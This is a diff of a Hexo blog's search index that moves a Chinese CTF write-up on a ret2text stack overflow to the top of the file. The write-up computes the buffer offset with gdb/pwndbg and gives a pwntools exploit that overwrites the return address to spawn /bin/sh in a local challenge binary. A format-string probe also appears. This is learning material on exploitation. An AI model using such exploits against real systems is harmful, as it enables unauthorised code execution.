@@ -1,6 +1,55 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF Wiki之栈溢出</title>
+    <url>/2022/06/15/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
+<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
+<span id="more"></span>
+
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>保护检查</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
+<p>32位，开启NX保护。</p>
+<p>查看调用的函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
+<p>发现sysytem、printf、gets、puts等。</p>
+<p>ida打开看看(F5反汇编)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
+<p>shift+f12查看字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
+<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
+<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
+<p><strong>使用gdb动态调试：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行截图如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p>攻击思路：</p>
+<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)			<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>			<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)	<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)		<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()			<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pwn学习路线</title>
     <url>/2022/06/01/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
     <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
@@ -166,55 +215,6 @@
 
 <p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
 <img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF Wiki之栈溢出</title>
-    <url>/2022/06/15/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
-    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
-<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
-<span id="more"></span>
-
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>保护检查</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
-<p>32位，开启NX保护。</p>
-<p>查看调用的函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
-<p>发现sysytem、printf、gets、puts等。</p>
-<p>ida打开看看(F5反汇编)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
-<p>shift+f12查看字符串</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
-<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
-<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />
-
-<p>可以造成溢出的gets函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
-<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
-<p><strong>使用gdb动态调试：</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>执行截图如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>
-
-
-
-<p>攻击思路：</p>
-<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)			<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>			<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)	<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)		<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()			<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>拿到shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
 ]]></content>
       <categories>
         <category>pwn</category>
